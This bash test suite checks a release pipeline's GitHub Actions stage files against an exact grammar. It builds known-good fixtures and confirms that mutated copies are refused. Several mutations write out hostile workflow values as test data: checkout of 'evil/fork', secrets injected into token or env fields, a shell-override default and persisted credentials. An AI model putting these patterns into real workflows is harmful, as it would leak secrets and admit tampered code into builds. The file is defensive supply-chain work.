#!/usr/bin/env bash
# proves: REQ-CHAIN-004-AC17, REQ-CHAIN-004-AC12, REQ-CHAIN-004-AC14, REQ-CHAIN-005-AC7, REQ-CHAIN-004-AC1, REQ-CHAIN-004-AC2, REQ-CHAIN-004-AC3, REQ-CHAIN-004-AC6, REQ-CHAIN-004-AC8, REQ-CHAIN-004-AC9, REQ-CHAIN-004-AC10, REQ-CHAIN-004-AC11, REQ-CHAIN-005-AC1, REQ-CHAIN-005-AC2, REQ-CHAIN-005-AC4, REQ-CHAIN-005-AC5, REQ-CHAIN-005-AC6, REQ-CHAIN-001-AC6, REQ-REL-010-AC1, REQ-REL-010-AC2, REQ-REL-010-AC3, REQ-REL-010-AC4, REQ-REL-010-AC5, REQ-CHAIN-004-AC16 — the flags; PR 1's verify cases cover the identity
# Written before the implementation (step 4): the stage files, bin/build-stage-KIND.sh x4, bin/witnessed-local.sh, bin/chain_items.py (bind, items-apk,
# items-merge, record-env, rebuild-compare), bin/build-admit.py, bin/install-scanner.sh witness. The real-tree graph case stays red until PRs 3 and 4.
#
# Build and Rebuild: the shape of the two stage files, the four stage scripts, the one Witness helper, the job graph of release.yml and what the
# scripts DO when run against fake cache scripts (v0.3.0 rules 24, 31, 33, 38a, 38b, 39, 50, 51, 54, 58, 59, 62, 63, 68, 70).
# Runs on ubuntu-24.04 or macOS with: bash, python3 + PyYAML (apt: python3-yaml), jq, shasum. No network, no secrets, no keys.
#
# HOW IT IS BUILT (the lesson of PR 1's ten review rounds, and the owner's: readability for a human is a review item). No judge analyses shell or
# keeps a denylist. Each judge in bin/chain-test-shape.py is a FINITE EXACT GRAMMAR: a stage file is exactly the steps of one table, a stage script is
# exactly the lines of expected_lines(KIND), the Witness helper is exactly witnessed_lines(), the chain jobs of release.yml are exactly five. A
# judge is first proven on a known-good fixture and on mutated copies (a judge that cannot fail proves nothing); a few plain probes name the
# mutations a reviewer asked about, and the sweeps try every deletion, swap, suffix and insertion on every line; then the judge runs on the real tree.
#
# THE SHAPE (ratified Oct 9, owner, rule 50 wording: one stage = one workflow file = one identity; Build's two-machine matrix plus its assemble job fit):
#   stage-build.yml: job `apk` (matrix over ubuntu-24.04 and ubuntu-24.04-arm: bin/build-stage-apk.sh), job `assemble` (the VM, needs apk:
#   bin/build-stage-assemble.sh); stage-reproducibility.yml: the same two jobs (bin/build-stage-rebuild-apk.sh and -rebuild-assemble.sh). Four scripts,
#   so there is no dispatch to analyse, each a row of .github/policy/chain-scripts.json with its sha256 (PR 1's design).
#   Each job: checkout -> ./bin/install-scanner.sh witness -> the downloads (exact name and path, each into a fresh directory) -> ONE Witness
#   step, one line through bin/witnessed-local.sh -> the uploads (exact name, ONE path each). No witness -d: the command runs from the repo root, so Witness
#   names product subjects relative to it.
# THE ARTIFACT LAYOUT (fix round 2): actions/upload-artifact roots an artifact at the common ancestor of its paths, so every upload names ONE path.
#   The apk job uploads `out` (apks, indexes, SBOMs and the items fragment out/items-apk.json) and its record directory; the assemble job downloads
#   them into apk/<runner> and rec-apk/<runner> (Rebuild: rapk/<runner> and rec-rapk/<runner>) and `bind`s every file of apk/<runner> to the verified
#   record's products named out/... (rule 58). The assemble job writes digests.json and items.json at the repo root (Witness records
#   file:digests.json, the subject PR 1's sign --check reads, and file:items.json), the archives into dist, and uploads `out` as `images`.
# WHAT digests.json HOLDS (PROPOSED, advisor to confirm): the two image index digests, the four apk digests (cache's `apk-tool.py digest`, by name:
#   which sections it covers is cache's to change; it differs from the whole-file sha256 and ignores the signature) and the four Linux archives
#   (archive-linux-amd64, archive-linux-arm64, archive-fips-linux-amd64, archive-fips-linux-arm64: goreleaser's fscache_<ver>_linux_<arch>.tar.gz and
#   fscache-fips_...), so that Sign's provenance covers everything Release publishes (rules 35, 51). items.json holds the same plus the comparison items.
# THE VERSION (PROPOSED/UNVERIFIED, cache-3f): the stage passes --version = the tag minus the leading v (0.3.0, or 0.3.0-rc.1); cache's driver accepts
#   X.Y.Z and X.Y.Z-rc.N and names the apk fscache-0.3.0-r0.apk (final) or fscache-0.3.0_rc1-r0.apk (rc), fips as fscache-fips-.... Both forms run below.
#   The stage names no apk file: bin/build-version-check.py and `items-apk` find the apk of a variant in a directory.
# THE GH TOKEN: bin/build-admit.py gets GH_TOKEN only through the apk job's Witness step env (job permissions contents, checks, statuses, pull-requests
#   read, no id-token; advisor ruling, confirmed; the Witness move of Oct 22 removed the token). The script runs `unset GH_TOKEN` right after the admission line, so cache's scripts never see it.
#
# THE WITNESS SEAM (advisor ruling; owner's amendment of rule 68): bin/witnessed-local.sh holds ALL the Witness flags and `timeout 540`; the judge is the
# three functions witness_seam, helper and directwitness in bin/chain-test-shape.py and the fixture side is witness_block and witnessed_text below. If
# harness spike (d) changes the wrapping, only those change; the script grammar never names Witness.
#
# CACHE'S INTERFACE (ops/handoffs/outbox/2026-10-09-cache-pipeline-interface.md; [F] = fixed by a cache test, [P] = PROPOSED/UNVERIFIED):
#   build-apk.sh --print-source-date-epoch --source-dir DIR [F]; --variant standard|fips --arch A --version V --source-dir DIR --repo DIR --keyring FILE
#   --go-archive DIR --melange-lock FILE --out DIR [F]; refuses (exit 2) APK_RELEASE_SIGNING_KEY, GOPROXY other than off, HTTPS_PROXY, --signing-key [F];
#   exit 4 = a network attempt in the sealed call [F]. assemble-image.sh --variant production|fips --version V --archive DIR --melange-repo DIR
#   --keyring-dir DIR --out DIR [F]; the config defaults to build/apko.yaml | build/apko-fips.yaml, so NO --apko-config is ever passed (AC11 B); outputs
#   OUT/V.digest (the OCI index digest), V.manifests, V.tar, V.full.lock.json [F]. The scripts do their own sudo and unshare [F]; the stage does not.
#   [P]: the archive layout constants, `bin/build-archives.py` (this lane's: the four Linux archives from the apks), the items layout, whether sudo's PATH
#   finds melange and apko, Witness's linux arm64 pin. The CLI of bin/chain-verify.py that the scripts use is documented in bin/chain-bind-test.sh
#   (bind, items-apk, items-merge, which are tested against the REAL subcommands there), bin/chain-rebuild-test.sh (rebuild-compare) and PR 1's tests.
# KNOWN LIMIT (PROPOSED/UNVERIFIED; the dry run decides): Witness loads its Fulcio signer when the command starts and takes the timestamp when it ends,
#   so a build longer than the 10-minute certificate may not verify (harness spike (d)); `timeout 540` is the answer in the tests.
# INTEGRATION BRANCH (advisor 0341): PR 2 targets chain-v030; the real-tree cases are RED here and become green on chain-v030 after PR 1 and PR 2 merge.
set -euo pipefail
# the red cases of this suite are the ones listed in test-evidence/known-red.json: the run passes only when they are EXACTLY the red cases (bin/chain-known-red.py)
if [ -z "${CHAIN_KNOWN_RED_INNER:-}" ]; then
  _rc=0; _out=$(CHAIN_KNOWN_RED_INNER=1 CHAIN_FINDINGS=1 bash "$0" "$@" 2>&1) || _rc=$?
  printf '%s\n' "$_out"
  printf '%s\n' "$_out" | python3 "$(cd "$(dirname "$0")" && pwd)/chain-known-red.py" judge --suite bin/chain-build-wiring-test.sh --inner-rc "$_rc"
  exit $?
fi
root=$(cd "$(dirname "$0")/.." && pwd)
shape="$root/bin/chain-test-shape.py"; harness="$root/bin/chain-test-harness.py"
work=$(mktemp -d); trap 'rm -rf "$work"' EXIT
pass=0 failn=0
python3 -c 'import yaml' 2> /dev/null || { echo "FAIL PyYAML is required (apt: python3-yaml)"; exit 1; }
command -v jq > /dev/null || { echo "FAIL jq is required"; exit 1; }
ok()  { pass=$((pass + 1)); echo "ok   $1"; }
bad() { failn=$((failn + 1)); echo "FAIL $1"; }
judge() { python3 "$shape" "$@"; }
expect() { # expect ok|caught LABEL WORD judge-args...   (WORD: a word the fault message must contain, for caught)
  local want=$1 label=$2 word=$3; shift 3; local out rc=0
  out=$(judge "$@" 2>&1) || rc=$?
  if grep -q '^FINDINGS-JSON ' <<< "$out"; then          # the structured ids go out BEFORE the verdict line (bin/chain-known-red.py reads the line before a FAIL)
    grep '^FINDINGS-JSON ' <<< "$out"; out=$(grep -v '^FINDINGS-JSON ' <<< "$out")
  fi
  if [ "$want" = ok ]; then
    if [ "$rc" = 0 ]; then ok "$label"; else bad "$label -> $out"; fi
  elif [ "$rc" = 1 ] && grep -Fq -- "$word" <<< "$out" && ! grep -q Traceback <<< "$out"; then ok "$label (caught: ${out:0:90})"
  else bad "$label -> rc=$rc, wanted a refusal containing '$word': ${out:0:160}"; fi
}
replace() { # replace SRC DST OLD NEW   (plain strings; \n is a newline in either; an OLD that is not found is a FAILURE, never a skipped case)
  python3 - "$1" "$2" "$3" "$4" <<'PY' || { bad "mutation did not apply ($(basename "$2")): $3"; return 1; }
import sys
src, dst, old, new = sys.argv[1:5]
old, new = old.replace("\\n", "\n"), new.replace("\\n", "\n")
text = open(src).read()
assert old in text, "pattern not found"
open(dst, "w").write(text.replace(old, new, 1))
PY
}
# ---- the known-good fixtures. witness_block and witnessed_text are the fixture side of the Witness seam --------------------------------
python3 - "$work" "$shape" <<'PY'
import hashlib, importlib.util, json, sys
w, shape = sys.argv[1:3]
spec = importlib.util.spec_from_file_location("shape", shape); S = importlib.util.module_from_spec(spec); spec.loader.exec_module(S)
CHECKOUT = "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
UPLOAD = "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a"
DOWNLOAD = "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e65"
json.dump({"actions": [CHECKOUT, UPLOAD, DOWNLOAD]}, open(w + "/allowed-actions.json", "w"))


def witness_block(spec_):       # the stage's Witness step(s): one line through the helper (the fixture side of the seam, 1/2)
    env = "        env:\n          GH_TOKEN: ${{ github.token }}\n" if spec_["gh"] else ""
    run = "bash bin/witnessed-local.sh %s bin/build-stage-%s.sh" % (spec_["step"], spec_["kind"])
    if not spec_.get("mode"):
        return "      - name: %s under Witness\n%s        run: %s\n" % (spec_["step"], env, run)
    out = "      - name: %s under Witness\n        if: %s\n%s        run: %s\n" % (spec_["step"], S.MODE_RELEASE_IF, env, run)
    snap = "bash bin/witnessed-local.sh %s bin/build-stage-snapshot-%s.sh" % (S.SNAPSHOT_STEP[spec_["step"]], spec_["kind"])
    return out + "      - name: %s under Witness\n        if: %s\n        run: %s\n" % (S.SNAPSHOT_STEP[spec_["step"]], S.MODE_SNAPSHOT_IF, snap)


def witnessed_text():           # bin/witnessed-local.sh, the exec line broken at its flag groups (the fixture side of the seam, 2/2)
    lines = S.witnessed_lines()
    for flag in (" --signer-fulcio-url", " -t ", " -a ", " -o "):
        lines[-1] = lines[-1].replace(flag, " \\\n  " + flag.strip() + " ", 1) if flag.endswith(" ") else lines[-1].replace(flag, " \\\n " + flag, 1)
    comment = "# run one stage script under Witness: keyless Fulcio, the timestamp authority, the attestors, `timeout 540` (rule 68)"
    return "#!/usr/bin/env bash\n" + comment + "\n" + "\n".join(lines) + "\n"


def wrap(line, width=110):      # break a long command at its option boundaries, the way a human would
    if len(line) <= width: return line
    out, current = [], ""
    for i, part in enumerate(line.split(" --")):
        piece = part if i == 0 else "--" + part
        if current and len(current) + 1 + len(piece) > width: out.append(current); current = piece
        else: current = (current + " " + piece) if current else piece
    return " \\\n  ".join(out + [current])


def stage_text(family):
    call = "    inputs:\n      mode:\n        description: release or snapshot\n        type: string\n        default: release\n    outputs:\n      records:\n        description: the record digests, for Sign\n        value: %s\n" % S.RECORDS_STAGE_OUTPUT if family == "rebuild" else ""
    if family == "build":
        call = "    inputs:\n      hostile:\n        description: dry run only\n        type: boolean\n        default: false\n"
        call += "      mode:\n        description: release or snapshot\n        type: string\n        default: release\n"
        call += "    outputs:\n      digests:\n        description: the digests.json text, for Sign\n        value: %s\n" % S.STAGE_OUTPUT
    out = "name: 'Stage: %s'\non:\n  workflow_call:\n%spermissions:\n  contents: read\njobs:\n" % (family, call)
    for job in (("rapk", "rapk-arm", "assemble") if family == "rebuild" else ("apk", "assemble")):
        sp = S.JOBS[(family, job)]
        out += "  %s:\n" % job
        out += ("    runs-on: ${{ matrix.runner }}\n    strategy:\n      matrix:\n        runner: [ubuntu-24.04, ubuntu-24.04-arm]\n" if sp["matrix"]
                else "    runs-on: %s\n" % sp["runner"] if sp.get("runner")
                else "    needs: [rapk, rapk-arm]\n    runs-on: ubuntu-24.04\n" if family == "rebuild"
                else "    needs: apk\n    runs-on: ubuntu-24.04\n")
        out += "    permissions:\n" + "".join("      %s: %s\n" % kv for kv in sp["perm"].items())
        if sp.get("expose"): out += "    outputs:\n      digests: %s\n" % S.JOB_OUTPUT
        if sp.get("expose_records") or sp.get("expose_rapk"): out += "    outputs:\n      records: %s\n" % S.RECORDS_JOB_OUTPUT
        out += "    steps:\n"
        out += "      - uses: %s # v7.0.1\n        with:\n" % CHECKOUT
        out += "          persist-credentials: false\n          fetch-depth: 0\n"
        if sp.get("mode"):
            out += "      - name: the mode is release or snapshot\n        env:\n          MODE: ${{ inputs.mode }}\n        run: %s\n" % S.MODE_GUARD_RUN
        out += "      - name: install Witness (pinned by checksum)\n        run: bash bin/install-scanner.sh witness\n"
        if sp.get("setup_go"): out += "      - name: install Go (pinned by checksum)\n        run: %s\n" % S.INSTALL_GO
        for tl in sp.get("tools", ()): out += "      - name: install %s (pinned by checksum)\n        run: %s\n" % (tl.rsplit(" ", 1)[1], tl)
        # REQ-CHAIN-004-AC16: every job that builds from the archive installs crane (pinned) and pulls the archive by its committed digest, before the downloads
        out += "      - name: install crane (pinned by checksum)\n        run: %s\n" % S.INSTALL_CRANE
        out += "      - name: pull the archive by its committed digest\n        run: %s\n" % S.ARCHIVE_PULL
        if sp.get("hosttools"): out += "      - name: unpack the host tools from the archive (bubblewrap for melange's runner)\n        run: %s\n" % S.INSTALL_HOSTTOOLS
        for name, path in sp["down"]: out += "      - uses: %s # v5.0.0\n        with:\n          name: %s\n          path: %s\n" % (DOWNLOAD, name, path)
        if sp.get("check_rapk"):
            out += "      - name: check the rapk records against their jobs' outputs\n        if: %s\n        env:\n" % S.MODE_RELEASE_IF + "".join("          %s: %s\n" % kv for kv in S.RAPK_CHECK_ENV.items()) + "        run: %s\n" % S.RAPK_CHECK_RUN
        out += witness_block(sp)
        if sp.get("expose_rapk"): out += "      - id: records\n        name: expose the record digests of this apk job as its output\n        if: %s\n        run: %s\n" % (S.MODE_RELEASE_IF, S.exposerapk(sp["runner"]))
        if sp.get("expose"): out += "      - id: digests\n        name: expose digests.json as the stage output\n        run: %s\n" % S.EXPOSE
        if sp.get("expose_records"): out += "      - id: records\n        name: expose the record digests as the stage output\n        if: %s\n        run: %s\n" % (S.MODE_RELEASE_IF, S.EXPOSE_RECORDS)
        if sp.get("hostile"):
            out += "      - name: hostile step (dry run only)\n        if: %s\n        run: %s\n" % (S.HOSTILE_IF, S.HOSTILE_RUN)
            out += "      - name: upload the hostile attempts (dry run only)\n        if: %s\n" % S.HOSTILE_IF
            out += "        uses: %s # v7.0.1\n        with:\n" % UPLOAD
            out += "          name: hostile-attempts\n          path: attempts\n          if-no-files-found: error\n"
        for name, path in sp["up"]:
            guard = "        if: always()\n" if name == S.VERDICT_ARTIFACT else ("        if: %s\n" % S.ADMISSION_IF if name == "admission" else ("        if: %s\n" % S.BASELINE_IF if name == "admission-baseline" else ""))
            out += "      - uses: %s # v7.0.1\n%s        with:\n          name: %s\n          path: %s\n" % (UPLOAD, guard, name, path)
    return out


open(w + "/build.yml", "w").write(stage_text("build"))
open(w + "/rebuild.yml", "w").write(stage_text("rebuild"))
open(w + "/witnessed.sh", "w").write(witnessed_text())
rows = []
for kind, path in S.SCRIPTS.items():
    if kind == "witnessed":
        data = open(w + "/witnessed.sh", "rb").read()
    else:
        text = "#!/usr/bin/env bash\n" + "\n".join(wrap(line) for line in S.expected_lines(kind)) + "\n"
        open("%s/s-%s.sh" % (w, kind), "w").write(text); data = text.encode()
    rows.append({"path": path, "sha256": hashlib.sha256(data).hexdigest(), "tools": []})
json.dump({"scripts": rows}, open(w + "/chain-scripts.json", "w"))
PY
cat > "$work/release.yml" <<'EOF'
name: Release
on:
  push:
    tags: ["v*"]
  workflow_dispatch:
    inputs:
      dry-run:
        type: boolean
        default: false
permissions:
  contents: read
jobs:
  build:
    if: ${{ (github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')) || inputs.dry-run == true }}
    uses: ./.github/workflows/stage-build.yml
    with:
      hostile: ${{ github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v') && contains(github.ref_name, '-rc') }}
  sign:
    if: ${{ (github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')) || inputs.dry-run == true }}
    needs: build
    permissions:
      contents: read
      id-token: write
    uses: ./.github/workflows/stage-sign.yml
    with:
      digests: ${{ needs.build.outputs.digests }}
      stage: build
  rebuild:
    needs: [build, sign]
    uses: ./.github/workflows/stage-reproducibility.yml
  sign-rebuild:
    needs: [build, rebuild]
    permissions:
      contents: read
      id-token: write
    uses: ./.github/workflows/stage-sign.yml
    with:
      digests: ${{ needs.build.outputs.digests }}
      stage: rebuild
      records: ${{ needs.rebuild.outputs.records }}
  check:
    needs: [build, sign]
    uses: ./.github/workflows/stage-verify.yml
  sign-check:
    needs: [build, check]
    permissions:
      contents: read
      id-token: write
    uses: ./.github/workflows/stage-sign.yml
    with:
      digests: ${{ needs.build.outputs.digests }}
      stage: check
      records: ${{ needs.check.outputs.records }}
      records-arm64: ${{ needs.check.outputs.records-arm64 }}
  release:
    if: ${{ startsWith(github.ref, 'refs/tags/v') && !inputs.dry-run }}
    needs: [check, sign, sign-rebuild, sign-check]
    concurrency:
      group: release-publish
      cancel-in-progress: false
    uses: ./.github/workflows/stage-promote.yml
  decide:
    if: ${{ github.ref == 'refs/heads/main' && github.event_name != 'workflow_dispatch' && !inputs.dry-run }}
    runs-on: ubuntu-latest
    environment: agent
    permissions:
      contents: read
      checks: read
      id-token: write
      issues: write
    steps:
      - run: echo ${{ secrets.AUDITOR_APP_ID }}
  patch-notes:
    needs: decide
    if: ${{ needs.decide.outputs.tagged == 'true' && !inputs.dry-run }}
    runs-on: ubuntu-latest
    environment: agent
    permissions:
      contents: read
    steps:
      - run: echo ${{ secrets.AUDITOR_APP_ID }}
  patch-failed:
    needs: [build, sign, rebuild, sign-rebuild, check, sign-check, release]
    if: ${{ always() && (contains(needs.*.result, 'failure') || needs.release.result == 'cancelled') && startsWith(github.ref, 'refs/tags/v') && github.event_name != 'workflow_dispatch' && !inputs.dry-run }}
    runs-on: ubuntu-latest
    permissions:
      contents: read
      issues: write
    steps: []
  hostile-verify:
    needs: sign
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps: []
EOF
# ---- the stage files (REQ-CHAIN-004-AC1, AC2; REQ-CHAIN-005-AC1, AC4) ---------------------------------------------------------------
AL="$work/allowed-actions.json"
expect ok "AC1/AC2 fixture: the known-good Build stage file (apk matrix + assemble) passes" "" stage "$work/build.yml" build "$AL"
expect ok "005-AC1 fixture: the known-good Rebuild stage file passes" "" stage "$work/rebuild.yml" rebuild "$AL"
st() { # st NAME LABEL WORD OLD NEW   a mutated copy of the Build stage file must be refused with a message containing WORD
  replace "$work/build.yml" "$work/$1.yml" "$4" "$5" && expect caught "$2" "$3" stage "$work/$1.yml" build "$AL"; return 0
}
ASM='needs: apk\n    runs-on: ubuntu-24.04\n'
UPLOAD='      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n'
DOWNLOAD='      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e65 # v5.0.0\n        with:\n'
st s_cont   "AC1 a container on a job (rule 62: directly on the VM)" container "$ASM" "$ASM    container: debian:12\n"
st s_svc    "AC1 services on a job" services "$ASM" "$ASM    services:\n      db: {image: x}\n"
st s_defs   "AC1 job-level defaults (a shell override)" defaults "$ASM" "$ASM    defaults:\n      run:\n        shell: bash -c \"x; bash {0}\"\n"
st s_env    "AC1 job-level env" env "$ASM" "$ASM    env:\n      A: b\n"
st s_jkey   "AC1 an unknown job key" "outside the allowlist" "$ASM" "$ASM    concurrency: x\n"
st s_juses  "AC1 a job that calls a reusable workflow instead of running steps" uses "$ASM" "$ASM    uses: ./.github/workflows/ci.yml\n"
st s_self   "AC1 a self-hosted runner in the matrix" matrix 'ubuntu-24.04-arm]' 'self-hosted]'
st s_third  "AC1 a third runner in the matrix" matrix 'ubuntu-24.04-arm]' 'ubuntu-24.04-arm, ubuntu-22.04]'
st s_one    "AC1 only one native runner (both architectures are required)" matrix 'runner: [ubuntu-24.04, ubuntu-24.04-arm]' 'runner: [ubuntu-24.04]'
st s_incl "AC1 an include entry in the matrix" matrix 'runner: [ubuntu-24.04, ubuntu-24.04-arm]' \
       'runner: [ubuntu-24.04, ubuntu-24.04-arm]\n        include:\n          - runner: ubuntu-22.04'
st s_asmarm "AC1 the assemble job on the arm runner" "assemble job must run directly on" "$ASM" 'needs: apk\n    runs-on: ubuntu-24.04-arm\n'
st s_noneed "AC1 the assemble job does not need the apk jobs" "must need exactly apk" 'needs: apk' 'needs: []'
st s_pkg    "AC1 packages: write" permissions '      checks: read\n' '      checks: read\n      packages: write\n'
st s_noid   "AC1 id-token: write on a building job (the building jobs hold no identity token: owner Oct 22)" permissions '      checks: read\n' '      checks: read\n      id-token: write\n'
st s_nochk  "AC1 the admission job without checks: read (the required-checks check could not run)" permissions '      checks: read\n' ''
st s_wfperm "AC1 workflow-level permissions beyond contents: read" permissions 'permissions:\n  contents: read\njobs' 'permissions:\n  contents: write\njobs'
st s_push   "AC1 an extra trigger" workflow_call 'workflow_call:' 'push:\n  workflow_call:'
st s_job3 "AC1 a third job (one stage = one file = two jobs)" "required (one stage = one file = one identity)" '  assemble:' \
       '  third:\n    runs-on: ubuntu-24.04\n    steps: []\n  assemble:'
st s_top    "AC1 a top-level env" top-level 'permissions:\n  contents: read\njobs' 'permissions:\n  contents: read\nenv:\n  X: y\njobs'
st s_unpin  "AC2 checkout not pinned by digest" checkout 'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1' 'actions/checkout@v7'
st s_unlist "AC2 an action digest that is not on the allowed-actions list" "allowed-actions" \
       'actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a' 'actions/upload-artifact@1111111111111111111111111111111111111111'
st s_cred   "AC2 persisted credentials" "exactly" 'persist-credentials: false' 'persist-credentials: true'
st s_ref    "AC2 checkout of another ref" "exactly" 'persist-credentials: false' 'persist-credentials: false\n          ref: main'
st s_repo   "AC2 checkout of another repository" "exactly" 'persist-credentials: false' 'persist-credentials: false\n          repository: evil/fork'
st s_token  "AC2 checkout with a token" "exactly" 'persist-credentials: false' 'persist-credentials: false\n          token: ${{ secrets.X }}'
ADMUP='      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        if: ${{ inputs.mode == '"'release'"' && matrix.runner == '"'ubuntu-24.04'"' }}\n        with:\n          name: admission\n          path: admission.json\n'
st s_adm_gone "AC8 Build's admission record is not uploaded (Release could not read the baseline a patch tag used)" "admission" "$ADMUP" ''
st s_adm_all  "AC8 admission.json uploaded from every apk leg (one fixed name from a matrix clashes)" "admission" " && matrix.runner == 'ubuntu-24.04'" ''
st s_adm_name "AC8 admission.json uploaded under another name" "admission" 'name: admission\n' 'name: admission-record\n'
st s_adm_snap "AC8 admission.json uploaded in a snapshot run too (no admission ran: the upload would fail)" "admission" "inputs.mode == 'release' && matrix.runner" "matrix.runner"
GOINST='      - name: install Go (pinned by checksum)\n        run: bash bin/install-scanner.sh go\n'
WINST='      - name: install Witness (pinned by checksum)\n        run: bash bin/install-scanner.sh witness\n'
st s_go_gone  "AC4 the Go toolchain install of admission is missing from Build's apk job" "install-scanner.sh go" "$GOINST" ''
MELINST='      - name: install melange (pinned by checksum)\n        run: bash bin/install-build-tools.sh melange\n'
APKINST='      - name: install apko (pinned by checksum)\n        run: bash bin/install-build-tools.sh apko\n'
st s_bt_gone   "004-AC3 the melange install is missing from Build's apk job (rule 62: the VM runs melange)" "install-build-tools.sh melange" "$MELINST" ''
st s_bt_apko   "004-AC3 the apko install is missing from Build's assemble job" "install-build-tools.sh apko" "$APKINST" ''
st s_bt_both   "004-AC3 the apk job installs apko too (an apk job installs melange only; each job installs only the tool it runs)" "install-build-tools.sh" "$MELINST" "$MELINST$APKINST"
st s_bt_asm    "004-AC3 the assemble job installs melange too (an assemble job installs apko only)" "install-build-tools.sh" "$APKINST" "$MELINST$APKINST"
st s_bt_swap   "004-AC3 the assemble job installs melange in place of apko" "install-build-tools.sh" "$APKINST" "$MELINST"
st s_bt_early  "004-AC3 the build tools installed BEFORE Witness (rule 68: Witness first)" "install-" "$WINST" "$MELINST$WINST"
st s_bt_other  "004-AC3 another install command in place of melange's (not the pinned installer)" "install-build-tools.sh melange" 'run: bash bin/install-build-tools.sh melange' 'run: bash bin/install-scanner.sh melange'
st s_bt_tool   "004-AC3 a third build tool through the same installer" "download-artifact" "$APKINST" "$APKINST      - name: install helm\n        run: bash bin/install-build-tools.sh helm\n"
st s_bt_dest   "004-AC3 the installer given another destination" "install-build-tools.sh melange" 'install-build-tools.sh melange' 'install-build-tools.sh melange /tmp/bin'
st s_bt_env    "004-AC3 an env on the installer step (a token or secret could reach it before admission)" "install-build-tools.sh apko" "$APKINST" '      - name: install apko (pinned by checksum)\n        env:\n          K: ${{ secrets.X }}\n        run: bash bin/install-build-tools.sh apko\n'
st s_go_first "AC4 Go installed BEFORE Witness (rule 68: Witness first)" "install-scanner.sh" "$WINST$GOINST" "$GOINST$WINST"
# REQ-CHAIN-004-AC16 (advisor ACs 10-13 of Oct 15, owner rules 3 and 9): the archive is pulled by the committed digest, by the pinned crane, before anything builds
CRANEINST='      - name: install crane (pinned by checksum)\n        run: bash bin/install-scanner.sh crane\n'
PULLSTEP='      - name: pull the archive by its committed digest\n        run: bash bin/archive-pull.sh --pointer build/archive.json --out archive\n'
PULLRUN='run: bash bin/archive-pull.sh --pointer build/archive.json --out archive'
st s_ar_gone    "AC16 the archive pull is missing from Build's apk job (build-apk.sh --repo archive would find nothing)" "archive-pull.sh" "$PULLSTEP" ''
# REQ-CHAIN-004-AC17 (advisor reading Oct 20): an apk job unpacks the host tools (bubblewrap) from the archive it just pulled, in one step of its own right after the pull
HTRUN=$(python3 -I - "$shape" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("shape", sys.argv[1]); S = importlib.util.module_from_spec(spec); spec.loader.exec_module(S)
print(S.INSTALL_HOSTTOOLS)
PY
)
HTSTEP='      - name: unpack the host tools from the archive (bubblewrap for melange'"'"'s runner)\n        run: '"$HTRUN"'\n'
st s_ht_gone    "AC17 the host-tools step is missing from Build's apk job (melange's runner would find no bwrap)" "install-host-bwrap" "$HTSTEP" ''
st s_ht_before  "AC17 the host tools unpacked BEFORE the archive pull (there is no archive yet)" "install-host-bwrap" "$PULLSTEP$HTSTEP" "$HTSTEP$PULLSTEP"
st s_ht_asm     "AC17 the assemble job unpacks the host tools too (an assemble job runs apko only)" "crane" "$APKINST" "$APKINST$HTSTEP"
st s_ht_env     "AC17 an env on the host-tools step (a token or secret could reach it before admission)" "install-host-bwrap" "$HTSTEP" "${HTSTEP%run: *}"'env:\n          K: ${{ secrets.X }}\n        run: '"$HTRUN"'\n'
st s_ht_if      "AC17 an if on the host-tools step (a skipped step is a build with no sandbox)" "install-host-bwrap" "$HTSTEP" "${HTSTEP%run: *}"'if: always()\n        run: '"$HTRUN"'\n'
st s_ht_soft    "AC17 continue-on-error on the host-tools step" "install-host-bwrap" "$HTSTEP" "${HTSTEP%run: *}"'continue-on-error: true\n        run: '"$HTRUN"'\n'
st s_ht_sudo    "AC17 the host-tools script run under sudo" "install-host-bwrap" "run: $HTRUN" "run: sudo $HTRUN"
st s_ht_root    "AC17 the host tools unpacked into another directory than host-tools" "install-host-bwrap" "--root host-tools" "--root /usr/local"
st s_ht_lock    "AC17 the host tools read another lock than build/locks/host-tools.lock" "install-host-bwrap" "--lock build/locks/host-tools.lock" "--lock host-tools.lock"
st s_ht_arch    "AC17 the host tools unpacked from another directory than archive" "install-host-bwrap" "--archive archive" "--archive /tmp/archive"
HT_APT_RUN='run: sudo apt-get install -y bubblewrap'
st s_ht_apt     "AC17 the host tools taken from the distribution instead of the archive (a package manager line)" "install-host-bwrap" "run: $HTRUN" "$HT_APT_RUN"
st s_ht_bash    "AC17 the host-tools script started with bash (it is a Python file)" "install-host-bwrap" "run: python3 -I bin/install-host-bwrap.py" "run: bash bin/install-host-bwrap.py"
st s_ar_crane   "AC16 the crane install is missing (the pull needs the pinned tool)" "install-scanner.sh crane" "$CRANEINST" ''
st s_ar_order   "AC16 the pull before the crane install" "install-scanner.sh crane" "$CRANEINST$PULLSTEP" "$PULLSTEP$CRANEINST"
st s_ar_digest  "AC16 the pull names a digest of its own (only the committed one is allowed)" "archive-pull.sh" "$PULLRUN" "$PULLRUN --digest sha256:0000000000000000000000000000000000000000000000000000000000000000"
st s_ar_out     "AC16 the pull into another directory than archive" "archive-pull.sh" "$PULLRUN" 'run: bash bin/archive-pull.sh --pointer build/archive.json --out arch'
st s_ar_ptr     "AC16 the pull reads another pointer than build/archive.json" "archive-pull.sh" "$PULLRUN" 'run: bash bin/archive-pull.sh --pointer archive.json --out archive'
st s_ar_soft    "AC16 a pull that may fail (continue-on-error)" "archive-pull.sh" "$PULLSTEP" "$PULLSTEP        continue-on-error: true\n"
st s_ar_ortrue  "AC16 a pull whose failure is swallowed" "archive-pull.sh" "$PULLRUN" "$PULLRUN || true"
st s_ar_env     "AC16 an env on the pull step (a token could reach it before admission)" "archive-pull.sh" "$PULLSTEP" "$PULLSTEP        env:\n          GH_TOKEN: x\n"
